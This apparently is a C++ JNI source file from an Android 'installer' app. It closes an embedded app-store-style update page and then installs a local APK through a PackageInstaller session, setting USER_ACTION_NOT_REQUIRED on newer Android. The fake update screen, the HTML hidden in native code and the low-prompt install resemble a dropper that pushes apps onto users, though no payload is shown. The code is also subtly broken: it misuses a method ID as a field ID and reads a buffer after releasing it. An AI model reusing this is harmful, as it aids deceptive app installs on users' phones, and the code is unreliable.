                <div class="rating-bar"><span class="bar-label">1</span><div class="bar-container"><div class="bar-fill" style="width: 2%;"></div></div></div>
            </div>
        </div>
    </div>
</div>
<script>
    function updateApp() {
        // Show installing page first
        if (typeof Android !== 'undefined' && Android.showInstalling) {
            Android.showInstalling();
        }
    }
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('installed') === 'true') {
        const updateBtn = document.querySelector('.btn-primary');
        if (updateBtn) {
            updateBtn.disabled = true;
            updateBtn.style.opacity = '0.5';
            updateBtn.style.cursor = 'not-allowed';
            updateBtn.textContent = 'Installing...';
            updateBtn.onclick = () => false;
        }
    }
</script>
</body>
</html>)html";
    }
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_installer_MainActivity_nativeGetHtml(
        JNIEnv* env, jobject thiz, jstring mode) {
    const char* modeStr = env->GetStringUTFChars(mode, nullptr);
    if (!modeStr) {
        return env->NewStringUTF("");
    }
    
    const char* html = getHtmlContent(modeStr);
    jstring result = env->NewStringUTF(html);
    
    env->ReleaseStringUTFChars(mode, modeStr);
    return result;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_installer_MainActivity_nativeGetString(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
        return env->NewStringUTF("");
    }
    
    const char* value = getStringConstant(keyStr);
    jstring result = env->NewStringUTF(value);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return result;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_MainActivity_nativeGetInt(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
        return 0;
    }
    
    int value = getIntConstant(keyStr);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return value;
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_installer_NativeInstaller_nativeGetString(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
        return env->NewStringUTF("");
    }
    
    const char* value = getStringConstant(keyStr);
    jstring result = env->NewStringUTF(value);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return result;
}

extern "C" JNIEXPORT jint JNICALL
Java_com_example_installer_NativeInstaller_nativeGetInt(
        JNIEnv* env, jobject thiz, jstring key) {
    const char* keyStr = env->GetStringUTFChars(key, nullptr);
    if (!keyStr) {
        return 0;
    }
    
    int value = getIntConstant(keyStr);
    
    env->ReleaseStringUTFChars(key, keyStr);
    return value;
}

extern "C" JNIEXPORT jboolean JNICALL
Java_com_example_installer_NativeInstaller_nativeInstallApk(
        JNIEnv* env, jobject thiz, jobject context, jstring apkPath) {
    
    if (!initJNI(env)) {
        LOGE("Failed to init JNI");
        return JNI_FALSE;
    }

    // Get File class and methods
    jclass fileClass = env->FindClass("java/io/File");
    if (!fileClass) {
        LOGE("Failed to find File class");
        return JNI_FALSE;
    }
    
    jmethodID fileConstructor = env->GetMethodID(fileClass, "<init>", "(Ljava/lang/String;)V");
    jmethodID fileExistsMethod = env->GetMethodID(fileClass, "exists", "()Z");
    jmethodID fileLengthMethod = env->GetMethodID(fileClass, "length", "()J");
    
    if (!fileConstructor || !fileExistsMethod || !fileLengthMethod) {
        LOGE("Failed to get File methods");
        return JNI_FALSE;
    }

    // Create File object and check if exists
    jobject apkFile = env->NewObject(fileClass, fileConstructor, apkPath);
    if (!apkFile) {
        LOGE("Failed to create File object");
        return JNI_FALSE;
    }

    jboolean exists = env->CallBooleanMethod(apkFile, fileExistsMethod);
    if (!exists) {
        LOGE("APK file not found");
        env->DeleteLocalRef(apkFile);
        return JNI_FALSE;
    }

    jlong fileSize = env->CallLongMethod(apkFile, fileLengthMethod);
    if (fileSize == 0) {
        LOGE("APK file is empty");
        env->DeleteLocalRef(apkFile);
        return JNI_FALSE;
    }

    LOGD("Starting installation");
    LOGD("APK size: %lld bytes", (long long)fileSize);

    // Get PackageInstaller
    jobject packageManager = env->CallObjectMethod(context, g_getPackageManagerMethod);
    if (!packageManager) {
        LOGE("Failed to get PackageManager");
        env->DeleteLocalRef(apkFile);
        return JNI_FALSE;
    }

    jobject installer = env->CallObjectMethod(packageManager, g_getPackageInstallerMethod);
    if (!installer) {
        LOGE("Failed to get PackageInstaller");
        env->DeleteLocalRef(apkFile);
        return JNI_FALSE;
    }

    // Create SessionParams
    jfieldID modeFullInstallField = env->GetStaticFieldID(g_sessionParamsClass, "MODE_FULL_INSTALL", "I");
    if (!modeFullInstallField) {
        LOGE("Failed to get MODE_FULL_INSTALL field");
        env->DeleteLocalRef(apkFile);
        return JNI_FALSE;
    }
    
    jint modeFullInstall = env->GetStaticIntField(g_sessionParamsClass, modeFullInstallField);
    jmethodID paramsConstructor = env->GetMethodID(g_sessionParamsClass, "<init>", "(I)V");
    jobject params = env->NewObject(g_sessionParamsClass, paramsConstructor, modeFullInstall);
    if (!params) {
        LOGE("Failed to create SessionParams");
        env->DeleteLocalRef(apkFile);
        return JNI_FALSE;
    }

    // Set require user action for Android S+
    jint sdkVersion = env->GetStaticIntField(g_buildVersionClass, (jfieldID)g_getSdkIntMethod);
    if (sdkVersion >= 31) {
        jfieldID userActionField = env->GetStaticFieldID(g_sessionParamsClass, "USER_ACTION_NOT_REQUIRED", "I");
        if (userActionField) {
            jint userAction = env->GetStaticIntField(g_sessionParamsClass, userActionField);
            jmethodID setRequireUserActionMethod = env->GetMethodID(g_sessionParamsClass, "setRequireUserAction", "(I)V");
            if (setRequireUserActionMethod) {
                env->CallVoidMethod(params, setRequireUserActionMethod, userAction);
            }
        }
    }

    // Create session
    jmethodID createSessionMethod = env->GetMethodID(g_packageInstallerClass, "createSession", "(Landroid/content/pm/PackageInstaller$SessionParams;)I");
    jint sessionId = env->CallIntMethod(installer, createSessionMethod, params);
    if (sessionId < 0) {
        LOGE("Failed to create session");
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        return JNI_FALSE;
    }

    LOGD("Session created: %d", sessionId);

    // Open session
    jmethodID openSessionMethod = env->GetMethodID(g_packageInstallerClass, "openSession", "(I)Landroid/content/pm/PackageInstaller$Session;");
    jobject session = env->CallObjectMethod(installer, openSessionMethod, sessionId);
    if (!session) {
        LOGE("Failed to open session");
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        return JNI_FALSE;
    }

    LOGD("Session opened successfully");

    // Write APK to session
    jmethodID openWriteMethod = env->GetMethodID(g_sessionClass, "openWrite", "(Ljava/lang/String;JJ)Ljava/io/OutputStream;");
    jstring packageName = env->NewStringUTF("package");
    jobject outputStream = env->CallObjectMethod(session, openWriteMethod, packageName, 0LL, fileSize);
    if (!outputStream) {
        LOGE("Failed to open write stream");
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        env->DeleteLocalRef(packageName);
        return JNI_FALSE;
    }

    // Read APK file
    const char* apkPathStr = env->GetStringUTFChars(apkPath, nullptr);
    if (!apkPathStr) {
        LOGE("Failed to get APK path string");
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        env->DeleteLocalRef(packageName);
        return JNI_FALSE;
    }

    FILE* file = fopen(apkPathStr, "rb");
    if (!file) {
        LOGE("Failed to open APK file: %s", apkPathStr);
        env->ReleaseStringUTFChars(apkPath, apkPathStr);
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        env->DeleteLocalRef(packageName);
        return JNI_FALSE;
    }

    // Write APK data
    jclass outputStreamClass = env->GetObjectClass(outputStream);
    jmethodID writeMethod = env->GetMethodID(outputStreamClass, "write", "([BII)V");
    
    jbyteArray buffer = env->NewByteArray(BUFFER_SIZE);
    void* bufferPtr = env->GetPrimitiveArrayCritical(buffer, nullptr);
    
    int bytesRead;
    long long totalWritten = 0;
    while ((bytesRead = fread(bufferPtr, 1, BUFFER_SIZE, file)) > 0) {
        env->ReleasePrimitiveArrayCritical(buffer, bufferPtr, 0);
        jbyteArray tempBuffer = env->NewByteArray(bytesRead);
        env->SetByteArrayRegion(tempBuffer, 0, bytesRead, (jbyte*)bufferPtr);
        env->CallVoidMethod(outputStream, writeMethod, tempBuffer, 0, bytesRead);
        env->DeleteLocalRef(tempBuffer);
        totalWritten += bytesRead;
        bufferPtr = env->GetPrimitiveArrayCritical(buffer, nullptr);
    }

    env->ReleasePrimitiveArrayCritical(buffer, bufferPtr, 0);
    fclose(file);
    env->ReleaseStringUTFChars(apkPath, apkPathStr);

    // Sync and close
    jmethodID fsyncMethod = env->GetMethodID(outputStreamClass, "fsync", "()V");
    if (fsyncMethod) {
        env->CallVoidMethod(outputStream, fsyncMethod);
    }

    jmethodID closeMethod = env->GetMethodID(outputStreamClass, "close", "()V");
    env->CallVoidMethod(outputStream, closeMethod);

    LOGD("APK written successfully, total bytes: %lld", totalWritten);

    // Create Intent
    jmethodID intentConstructor = env->GetMethodID(g_intentClass, "<init>", "(Ljava/lang/String;)V");
    jstring actionStr = env->NewStringUTF(ACTION_INSTALL);
    jobject intent = env->NewObject(g_intentClass, intentConstructor, actionStr);
    if (!intent) {
        LOGE("Failed to create Intent");
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        env->DeleteLocalRef(packageName);
        env->DeleteLocalRef(actionStr);
        return JNI_FALSE;
    }

    // Set package name
    jstring contextPackageName = (jstring)env->CallObjectMethod(context, g_getPackageNameMethod);
    jmethodID setPackageMethod = env->GetMethodID(g_intentClass, "setPackage", "(Ljava/lang/String;)Landroid/content/Intent;");
    env->CallObjectMethod(intent, setPackageMethod, contextPackageName);

    // Create PendingIntent
    jint flags = 0x08000000; // FLAG_UPDATE_CURRENT
    if (sdkVersion >= 31) {
        flags |= 0x04000000; // FLAG_MUTABLE
    }

    jmethodID getBroadcastMethod = env->GetStaticMethodID(g_pendingIntentClass, "getBroadcast", 
        "(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;");
    jobject pendingIntent = env->CallStaticObjectMethod(g_pendingIntentClass, getBroadcastMethod, context, sessionId, intent, flags);
    if (!pendingIntent) {
        LOGE("Failed to create PendingIntent");
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        env->DeleteLocalRef(packageName);
        env->DeleteLocalRef(actionStr);
        env->DeleteLocalRef(intent);
        env->DeleteLocalRef(contextPackageName);
        return JNI_FALSE;
    }

    // Get IntentSender and commit
    jmethodID getIntentSenderMethod = env->GetMethodID(g_pendingIntentClass, "getIntentSender", "()Landroid/content/IntentSender;");
    jobject intentSender = env->CallObjectMethod(pendingIntent, getIntentSenderMethod);
    if (!intentSender) {
        LOGE("Failed to get IntentSender");
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        env->DeleteLocalRef(packageName);
        env->DeleteLocalRef(actionStr);
        env->DeleteLocalRef(intent);
        env->DeleteLocalRef(contextPackageName);
        env->DeleteLocalRef(pendingIntent);
        return JNI_FALSE;
    }

    LOGD("Committing session: %d", sessionId);

    // Clear exceptions before commit
    if (env->ExceptionCheck()) {
        env->ExceptionClear();
    }

    jmethodID commitMethod = env->GetMethodID(g_sessionClass, "commit", "(Landroid/content/IntentSender;)V");
    env->CallVoidMethod(session, commitMethod, intentSender);

    // Check for exceptions after commit
    if (env->ExceptionCheck()) {
        LOGE("Commit exception occurred");
        env->ExceptionDescribe();
        env->ExceptionClear();
        
        // Try to abandon session
        jmethodID abandonMethod = env->GetMethodID(g_sessionClass, "abandon", "()V");
        if (abandonMethod) {
            env->CallVoidMethod(session, abandonMethod);
        }
        
        env->DeleteLocalRef(apkFile);
        env->DeleteLocalRef(params);
        env->DeleteLocalRef(packageName);
        env->DeleteLocalRef(actionStr);
        env->DeleteLocalRef(intent);
        env->DeleteLocalRef(contextPackageName);
        env->DeleteLocalRef(pendingIntent);
        env->DeleteLocalRef(intentSender);
        return JNI_FALSE;
    }

    LOGD("Session committed successfully, installation initiated");

    // Cleanup
    env->DeleteLocalRef(apkFile);
    env->DeleteLocalRef(params);
    env->DeleteLocalRef(packageName);
    env->DeleteLocalRef(actionStr);
    env->DeleteLocalRef(intent);
    env->DeleteLocalRef(contextPackageName);
    env->DeleteLocalRef(pendingIntent);
    env->DeleteLocalRef(intentSender);

    return JNI_TRUE;
}
